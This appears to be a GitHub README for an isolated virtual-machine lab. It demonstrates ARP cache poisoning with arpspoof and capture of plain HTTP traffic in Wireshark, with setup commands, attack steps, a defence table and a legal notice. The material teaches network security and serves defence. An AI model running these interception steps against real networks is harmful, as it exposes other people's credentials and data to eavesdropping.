# s-curit-web
Here is everything in one block to paste directly:

---

```markdown
<div align="center">

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=26&pause=1000&color=FF0000&center=true&vCenter=true&width=750&lines=🕵️+MITM+Attack+Lab+—+Wireshark+Edition;ARP+Poisoning+·+Traffic+Interception+·+HTTP+Analysis;Built+in+an+Isolated+Virtual+Environment" alt="Typing SVG" />

<br/>

[![Purpose](https://img.shields.io/badge/🔬_Lab-Cybersecurity_Research-FF0000?style=for-the-badge)](.)
[![Kali](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)](.)
[![Ubuntu](https://img.shields.io/badge/Ubuntu-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)](.)
[![Wireshark](https://img.shields.io/badge/Wireshark-1679A7?style=for-the-badge&logo=wireshark&logoColor=white)](.)
[![VMware](https://img.shields.io/badge/VMware-607078?style=for-the-badge&logo=vmware&logoColor=white)](.)
[![Apache](https://img.shields.io/badge/Apache2-D22128?style=for-the-badge&logo=apache&logoColor=white)](.)

<br/>

*A hands-on network security lab demonstrating how unencrypted HTTP traffic can be silently intercepted through ARP cache poisoning — built entirely inside isolated virtual machines.*

</div>

---

## 🗺️ What This Lab Does

When two machines talk over a local network using HTTP, their conversation is completely exposed. This lab walks through every step of positioning an attacker silently between a victim and a web server — capturing everything in Wireshark without either machine noticing.

No magic. No black box. Just networking fundamentals pushed to their logical conclusion.

---

## 🖥️ Lab Topology

```
  ┌──────────────────────────────────────────────────────────────┐
  │                  VMware NAT  ·  192.168.244.0/24             │
  │                                                              │
  │  [💀 KALI]──────────────ARP POISON──────────[🎯 UBUNTU AGENT]│
  │  192.168.244.129           ↕↕↕↕↕           192.168.244.128  │
  │         │            all traffic                             │
  │         │            rerouted here                           │
  │         ▼                                                    │
  │  [🌐 UBUNTU SERVEUR]                                         │
  │   192.168.244.131                                            │
  │   Apache2 HTTP                                               │
  └──────────────────────────────────────────────────────────────┘
```

| Host | Function | OS | IP |
|------|----------|----|----|
| `kali` | 💀 Attacker — runs arpspoof + Wireshark | Kali Linux | `192.168.244.129` |
| `ubuntu-agent` | 🎯 Victim — browses the web server | Ubuntu Linux | `192.168.244.128` |
| `ubuntu-serveur` | 🌐 Target server — runs Apache2 | Ubuntu Linux | `192.168.244.131` |

---

## 🔩 Lab Setup — Step by Step

---

### 01 · Network Verification

Confirm each machine has the correct IP and can reach the others.

```bash
# Run on every machine
ip a

# From ubuntu-agent, verify connectivity to the web server
ping 192.168.244.131
```

<img width="2649" height="1845" alt="Image" src="https://github.com/user-attachments/assets/a1c179da-8347-4762-b6de-882656598396" />
<br><br>
<img width="2562" height="1674" alt="Image" src="https://github.com/user-attachments/assets/3ac9c992-5e9f-4028-82dd-b0043ae70515" />
<br><br>
<img width="2715" height="1809" alt="Image" src="https://github.com/user-attachments/assets/d0c2f1cb-0ae7-4099-8027-0bcc166a41e2" />
<br><br>
<img width="2460" height="675" alt="Image" src="https://github.com/user-attachments/assets/07666072-4cb6-4fc6-b0e8-7e630da8865b" />

---

### 02 · Deploy the Web Server (ubuntu-serveur)

Install Apache2 and expose a custom page over HTTP.

```bash
sudo apt update && sudo apt install apache2 -y
sudo systemctl start apache2
sudo systemctl enable apache2

# Drop a custom page
sudo nano /var/www/html/index.html
```

```html
<h1>Cybersecurity MITM Lab</h1>
```

```bash
# Verify locally
curl http://localhost
# → Cybersecurity MITM Lab
```

<img width="2583" height="633" alt="Image" src="https://github.com/user-attachments/assets/07f1268b-2471-4db9-8eb0-bb07cd2fbbfe" />
<br><br>
<img width="2430" height="327" alt="Image" src="https://github.com/user-attachments/assets/28063c65-ab1b-4df3-8bea-8881ba15235c" />

---

### 03 · Confirm HTTP from the Victim (ubuntu-agent)

The victim can reach the server — traffic is flowing and unprotected.

```bash
curl http://192.168.244.131
# → Cybersecurity MITM Lab
```

<img width="2424" height="243" alt="Image" src="https://github.com/user-attachments/assets/a6c4517a-eaba-4f02-9721-28e8247daeb7" />

---

### 04 · Start Wireshark on Kali

Open Wireshark before the attack so every poisoned packet is logged from the start.

```bash
sudo wireshark
```

> Select interface `eth0` → click **Start Capture**

<img width="3390" height="1920" alt="Image" src="https://github.com/user-attachments/assets/6317ffb9-eb1f-4da4-a5e9-04f6f81d0eab" />

---

### 05 · Flood the Network with HTTP Traffic (ubuntu-agent)

Keep the victim machine generating requests so there is plenty to intercept.

```bash
while true; do curl http://192.168.244.131; sleep 2; done
```

<img width="2556" height="567" alt="Image" src="https://github.com/user-attachments/assets/c6fdcaec-2ab1-4e98-85ed-590a08872cb2" />

---

### 06 · Turn Kali Into a Router

Without this, intercepted packets are dropped instead of forwarded — the victim loses connectivity and the attack becomes visible.

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Confirm
cat /proc/sys/net/ipv4/ip_forward
# → 1
```

<img width="2628" height="1833" alt="Image" src="https://github.com/user-attachments/assets/787fd8a1-23f8-4b6d-bae1-18e92e91ad5a" />

---

### 07 · Poison Both ARP Tables (Kali)

Two terminals. Two directions. Kali silently inserts itself into every exchange.

```bash
# Terminal 1 — tell the victim that Kali is the web server
sudo arpspoof -i eth0 -t 192.168.244.128 192.168.244.131

# Terminal 2 — tell the web server that Kali is the victim
sudo arpspoof -i eth0 -t 192.168.244.131 192.168.244.128
```

<img width="3393" height="1911" alt="Image" src="https://github.com/user-attachments/assets/47ca151c-a8f2-4360-82ad-a1baad094872" />

---

## 🔬 Wireshark — Reading the Intercepted Traffic

Apply this display filter to isolate HTTP exchanges:

```
http
```

<img width="3018" height="1902" alt="Image" src="https://github.com/user-attachments/assets/76f46da3-1e22-474b-8846-a869da672530" />

Every `GET` the victim sends and every `200 OK` the server replies with is now visible on Kali in plain text.

---

### Reconstruct the Full Conversation

```
Right-click any HTTP packet → Follow → HTTP Stream
```

You will see the complete exchange — headers, body, everything:

```http
GET / HTTP/1.1
Host: 192.168.244.131

HTTP/1.1 200 OK
Content-Type: text/html

<h1>Cybersecurity MITM Lab</h1>
```

<img width="3390" height="1911" alt="Image" src="https://github.com/user-attachments/assets/d883813d-f408-4243-8934-a923ccc1034b" />

On a real network this stream could contain login forms, session tokens, API keys, or personal data — all readable without any special decryption.

---

## ⚡ Why HTTP Fails Here

```
No encryption       →  every byte travels in the open
No authentication   →  no way to verify who you are talking to
No integrity check  →  responses can be modified in transit
```

ARP has no verification mechanism by design. Any machine on the subnet can claim any IP-to-MAC mapping — and the others will believe it.

---

## 🛡️ How to Defend Against This

| Defence | What it does |
|---------|-------------|
| 🔒 **HTTPS + TLS** | Encrypts the entire conversation — interception yields only ciphertext |
| 🔑 **HSTS** | Forces browsers to refuse plain HTTP connections entirely |
| 🔍 **Dynamic ARP Inspection** | Switch-level validation of ARP replies against a trusted table |
| 🌐 **VPN / Zero-Trust** | All traffic tunnelled and authenticated regardless of network position |
| 🧱 **VLAN Segmentation** | Limits ARP broadcast domains — attacker cannot reach victim |
| 📊 **IDS / IPS** | Flags abnormal ARP activity patterns in real time |

---

## 🧰 Full Toolset

```
Kali Linux         —  attacker platform
Ubuntu (Agent)     —  victim machine
Ubuntu (Serveur)   —  Apache2 web server
Wireshark          —  packet capture & analysis
arpspoof (dsniff)  —  ARP cache poisoning
VMware Workstation —  isolated virtual network
```

---

## ⚖️ Legal Notice

> [!WARNING]
> This lab was built and executed exclusively for **educational purposes** inside a **fully isolated virtual environment** with no connection to external networks or third-party systems.
>
> All activities were conducted **legally** on machines owned and controlled by the author.
>
> Reproducing these techniques on any network you do not own or have explicit written permission to test is **illegal** under computer fraud laws in most jurisdictions.

---

<div align="center">

*Network security research · isolated lab · no real systems were harmed*

![Visitors](https://visitor-badge.laobi.icu/badge?page_id=mitm-lab-wireshark-v2)

</div>
```
